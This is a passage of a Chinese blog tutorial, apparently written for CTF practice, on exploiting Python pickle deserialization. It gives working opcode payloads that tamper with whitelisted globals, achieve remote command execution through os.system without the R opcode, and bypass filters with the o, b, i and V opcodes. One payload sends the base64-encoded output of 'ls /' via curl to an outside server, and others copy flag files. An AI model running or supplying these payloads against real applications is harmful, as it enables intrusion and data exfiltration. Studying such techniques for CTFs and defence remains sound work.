<p>load一下，发现真的引入了blue里面的变量</p>
<p>　　把这个payload进行base64编码之后传进题目，得到well done。</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-d02aeb43085db59a6d4b41f88c5ea68e_1440w.jpg" alt="img"></p>
<p>　　顺带一提，由于pickle导出的字符串里面有很多的不可见字符，所以一般都经过base64编码之后传输。</p>
<h4 id="绕过c指令module限制：先读入，再篡改"><a href="#绕过c指令module限制：先读入，再篡改" class="headerlink" title="绕过c指令module限制：先读入，再篡改"></a>绕过<code>c</code>指令<code>module</code>限制：先读入，再篡改</h4><p>　　之前提到过，<code>c</code>指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法， 然而<code>find_class</code>可以被出题人重写。如果出题人只允许<code>c</code>指令包含<code>__main__</code>这一个module，这道题又该如何解决呢？</p>
<p>　　通过GLOBAL指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>
<p>　　有了这个知识作为前提，我们可以干这么一件事：</p>
<ul>
<li>通过<code>__main__.blue</code>引入这一个module，由于命名空间还在main内，故不会被拦截</li>
<li>把一个dict压进栈，内容是<code>&#123;&#39;name&#39;: &#39;rua&#39;, &#39;grade&#39;: &#39;www&#39;&#125;</code></li>
<li>执行BUILD指令，会导致改写 <code>__main__.blue.name</code>和 <code>__main__.blue.grade</code> ，至此<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li>
<li>弹掉栈顶，现在栈变成空的</li>
<li>照抄正常的Student序列化之后的字符串，压入一个正常的Student对象，name和grade分别是’rua’和’www’</li>
</ul>
<p>　　由于栈顶是正常的Student对象，pickle.loads将会正常返回。到手的Student对象，当然name和grade都与blue.name、blue.grade对应了——我们刚刚亲手把blue篡改掉。</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nblue\n&#125;(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-be0b611551c62614ea92f06ffe234480_1440w.jpg" alt="img"></p>
<p>绿框区域完成了篡改</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-5d923ca1b18273daec2e8131b64b8721_1440w.jpg" alt="img"></p>
<p>　　题目返回了well done，而且此时blue.grade已经变成www，可见我们真的篡改了blue.</p>
<p>所以思路就是用现成的白名单来进行RCE</p>
<h4 id="不用reduce，也能RCE"><a href="#不用reduce，也能RCE" class="headerlink" title="不用reduce，也能RCE"></a>不用reduce，也能RCE</h4><p>　　之前谈到过，<code>__reduce__</code>与<code>R</code>指令是绑定的，禁止了<code>R</code>指令就禁止了<code>__reduce__</code> 方法。那么，在禁止<code>R</code>指令的情况下，我们还能RCE吗？这就是本文研究的重点。</p>
<p>　　现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用<code>fun(arg)</code>，其中<code>fun</code>和<code>arg</code>都必须可控。</p>
<p>　　审pickle源码，来看看BUILD指令（指令码为<code>b</code>）是如何工作的：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img"></p>
<p>BUILD指令实现</p>
<p>　　这里的实现方式也就是上文的注所提到的：如果<code>inst</code>拥有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理；否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__ </code>里面。</p>
<p>　　它有什么安全隐患呢？我们来想想看：<code>Student</code>原先是没有<code>__setstate__</code>这个方法的。那么我们利用<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>来BUILE这个对象，那么现在对象的<code>__setstate__</code>就变成了<code>os.system</code>；接下来利用<code>&quot;ls /&quot;</code>来再次BUILD这个对象，则会执行<code>setstate(&quot;ls /&quot;)</code> ，而此时<code>__setstate__</code>已经被我们设置为<code>os.system</code>，因此实现了RCE.</p>
<p>　　payload构造如下：</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-5f6f6661a916b296e3fac6fbed8427cc_1440w.jpg" alt="img"></p>
<p>　　执行结果：</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-44a237be1ffe80cf2969d217831fe5dd_1440w.jpg" alt="img"></p>
<p>　　成功RCE！接下来可以通过反弹shell来控制靶机了。</p>
<p>　　有一个可以改进的地方：这份payload由于没有返回一个Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常Student进栈。payload构造如下：</p>
<pre><code class="highlight text">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-fd188e8d3e3f341d719019b7e869bf9d_1440w.jpg" alt="img"></p>
<p>绿色框内为恶意代码</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-d5b6e15f6b0506689952cf0e8f93691f_1440w.jpg" alt="img"></p>
<p>　　没有抛出异常。</p>
<p>　　<strong>至此，我们完成了不使用<code>R</code>指令、无副作用的RCE。</strong></p>
<p>除此之外，其实我们还是可以通过一些其他类似的漏洞方法来打rce</p>
<pre><code class="highlight python">__reduce_ex__()
__setstate__()</code></pre>

<p>实例</p>
<pre><code class="highlight plaintext">#__setstate__:
import pickle
import pickletools
import os
class obj:
   def __init__(self,str1,str2):
      self.str1=str1;
      self.str2=str2;
   def __setstate__(self,name):
        os.system(&#x27;dir&#x27;)
#    def __reduce__(self):
#       return(os.system,(&#x27;dir&#x27;,))
class1=obj(&quot;str1&quot;,&quot;str2&quot;)
a=pickle.dumps(class1)      
print(a)
b=a
pickle.loads(b)

#setstate
</code></pre>

<h4 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h4><p>　　<strong>一</strong>、<strong>其他模块的load也可以触发pickle反序列化漏洞。</strong>例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p>
<p>　　二、即使代码中没有<code>import os</code>，**GLOBAL指令也可以自动导入<code>os.system</code>**。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p>
<p>　　三、<strong>即使没有回显，也可以很方便地调试恶意代码。</strong>只需要拥有一台公网服务器，执行<code>os.system(&#39;curl your_server/</code>ls &#x2F; | base64<code>)</code>，然后查询您自己的服务器日志，就能看到结果。这是因为：以&#96;&#96;&#96;引号包含的代码，在sh中会直接执行，返回其结果。</p>
<p>　　下面给出一个例子：</p>
<pre><code class="highlight text">payload  = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVcurl 47.***.***.105/`ls / | base64`\nb.&#x27;</code></pre>

<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-f60a5ad59d548b1ca78b839320318dfe_1440w.jpg" alt="img"></p>
<p>payload</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-377763e71f5d198566d7b40e418289f8_1440w.jpg" alt="img"></p>
<p>pickle.loads()效果</p>
<p><img src="/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/v2-0c450bc39b3ce69cdf14486ed14752c1_1440w.jpg" alt="img"></p>
<p><code>pickle.loads()</code>时，<code>ls /</code>的结果被base64编码后发送给服务器（红框）；我们的服务器查看日志，就可以得到命令执行结果。因此，在没有回显的时候，我们可以通过<code>curl</code>把执行结果送到我们的服务器上。</p>
<p>　　上文发出去的请求缺了一段，是因为url没有加引号。</p>
<p>GLOBAL操作符</p>
<pre><code class="highlight plaintext">GLOBAL操作符读取全局变量，是使用的find_class函数。而find_class对于不同的协议版本实现也不一样。总之，它干的事情是“去x模块找到y”，y必须在x的顶层（也即，y不能在嵌套的内层）</code></pre>

<h3 id="手搓opcode"><a href="#手搓opcode" class="headerlink" title="手搓opcode"></a>手搓opcode</h3><p>只要会自己写opcode事情就简单多了。把。</p>
<ol>
<li>o指令绕过</li>
</ol>
<pre><code class="highlight plaintext">payload1 = b&#x27;&#x27;&#x27;(cos
system
S&#x27;cat /f* &gt; /tmp/a&#x27;
o.&#x27;&#x27;&#x27;</code></pre>

<blockquote>
<p>先是用 ( 入栈一个MARK，然后用 c 导入os.system()函数入栈，然后用 S 定义字符串并入栈，最后用 o <strong>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数，</strong>结果是os.system(cat &#x2F;f* &gt; &#x2F;tmp&#x2F;a’o)， 点号是结束的意思</p>
</blockquote>
<ol start="2">
<li>b指令绕过</li>
</ol>
<pre><code class="highlight plaintext">payload2 =(c__main__
User
o&#125;(S&quot;\x5f\x5f\x73\x65\x74\x73\x74\x61\x74\x65\x5f\x5f&quot; //__setstate__
cos
system
ubS&quot;cat /ffl14aaaaaaagg&gt;/tmp/gkjzjh146&quot;
b.</code></pre>

<p>3.s指令绕过</p>
<p>如果<code>&#39;</code>或者<code>&quot;</code>被ban了的话怎么办捏，可以用V来代替</p>
<pre><code class="highlight plaintext">S&#x27;ls&#x27;
和
Vls
是一样的效果</code></pre>

<p>4.i一把梭</p>
<pre><code class="highlight python"><span class="keyword">import</span> pickle
opcode=<span class="string">b&#x27;&#x27;&#x27;(Vls</span>
<span class="string">ios</span>
<span class="string">system</span>
<span class="string">.&#x27;&#x27;&#x27;</span>
pickle.loads(opcode)</code></pre>

<p>直接代替了c和o的功能</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://ayan0.top/2025/05/13/%E9%9A%8F%E6%89%8B%E6%89%93%E7%9A%84pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">-Web</a></div><div class="post-share"><div class="social-share" data-image="/img/ari.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-07</div><div class="info-item-2">114514分钟能了解SSRF吗</div></div><div class="info-2"><div class="info-item-1">♿1919810分钟能了解SSRF吗♿冲刺♿，冲刺♿，冲♿ SSRF是扫码SSRF，全称Server-Side Request Forgery，服务器端请求伪造 关键词是ip 通过用户输入包含URL的功能&#x2F;请求参数包含外部资源应用来触发s 说白了就是通过一些方式偷偷的摸进内网视奸 目前有记载的主流的在PHP 说实话其实只要涉及对内网的文件有读取(从自身发起请求)，过滤又不充分的都会触发这个漏洞的 PHPfile_get_contents() fsockopen() curl_exec() fopen() readfile()  先讲第一个  file_get_contents()  &lt;?php $url = $_GET[&#x27;url&#x27;];; echo file_get_contents($url); ?&gt;  从url这个参数里获取内容，并指定一个文件名进行保存 而file_put_contents是把字符串写入文件当中  fsockopen()  &lt;?php  function GetFile($host,$port,$link)...</div></div></div></a><a class="pagination-related" href="/2025/04/28/%E5%88%9D%E8%A7%81XXE/" title="初见XXE"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-28</div><div class="info-item-2">初见XXE</div></div><div class="info-2"><div class="info-item-1">初见XXE这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。这是什么?XXE，注一下。 什么是XML呢XML，全称可扩展标记语言，XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。 XML文档结构包括XML声明+DTD文档类型定义+文档元素 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt; &lt;bookstore&gt;                                                 &lt;!--根元素--&gt; &lt;book...</div></div></div></a><a class="pagination-related" href="/2025/05/05/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" title="沙箱逃逸"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-05</div><div class="info-item-2">沙箱逃逸</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-01</div><div class="info-item-2">磨好的利剑:PHP原生类</div></div><div class="info-2"><div class="info-item-1">PHP原生类相当综合的应用呢，利用面广的不行，爽赤 常见的原生类有以下几个 1.Error/Exception 2.FilesystemIterator/SplFileObject/DirectoryIterator/GlobIterator 3.SoapClient 4.SimpleXMLElement  当然还有有些偶尔能用上的ZipArchive XSS利用Error&#x2F;Exception内置类Error:  仅适用于PHP7版本 在开启报错的情况下  我们可以查看一下Error的内置方法 &lt;?php $className = &#x27;Error&#x27;;  $methods = get_class_methods($className);  foreach ($methods as $method) &#123;     echo &quot;&#123;$className&#125;::&#123;$method&#125;&quot; ....</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-text">Pickle反序列化的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E8%83%BD%E5%90%83%E5%90%97"><span class="toc-text">pickle是什么，能吃吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PVM"><span class="toc-text">PVM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickletools"><span class="toc-text">pickletools</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E6%81%B6%E4%B9%8B%E6%BA%90%E2%80%93-reduce-%E6%96%B9%E6%B3%95"><span class="toc-text">万恶之源–__reduce__方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF"><span class="toc-text">WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%87%BD%E6%95%B0%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">绕过函数黑名单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8C%85%E5%90%AB%EF%BC%9Ac%E6%8C%87%E4%BB%A4%E7%A0%81%E7%9A%84%E5%A6%99%E7%94%A8"><span class="toc-text">全局变量包含：c指令码的妙用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87c%E6%8C%87%E4%BB%A4module%E9%99%90%E5%88%B6%EF%BC%9A%E5%85%88%E8%AF%BB%E5%85%A5%EF%BC%8C%E5%86%8D%E7%AF%A1%E6%94%B9"><span class="toc-text">绕过c指令module限制：先读入，再篡改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E7%94%A8reduce%EF%BC%8C%E4%B9%9F%E8%83%BDRCE"><span class="toc-text">不用reduce，也能RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82"><span class="toc-text">一些细节</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%90%93opcode"><span class="toc-text">手搓opcode</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/" title="刷题蛆来咯-CTFshow">刷题蛆来咯-CTFshow</a><time datetime="2025-07-07T06:19:38.000Z" title="发表于 2025-07-07 14:19:38">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗">114514分钟能了解SSRF吗</a><time datetime="2025-07-07T05:05:59.000Z" title="发表于 2025-07-07 13:05:59">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类">磨好的利剑:PHP原生类</a><time datetime="2025-07-01T05:58:51.000Z" title="发表于 2025-07-01 13:58:51">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/" title="Nosql注入">Nosql注入</a><time datetime="2025-07-01T02:35:37.000Z" title="发表于 2025-07-01 10:35:37">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/" title="2025年中总结">2025年中总结</a><time datetime="2025-06-22T08:06:33.000Z" title="发表于 2025-06-22 16:06:33">2025-06-22</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2688080408" data-server="netease" data-type="song" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => fn())
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      pjax.loadUrl('/404')
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>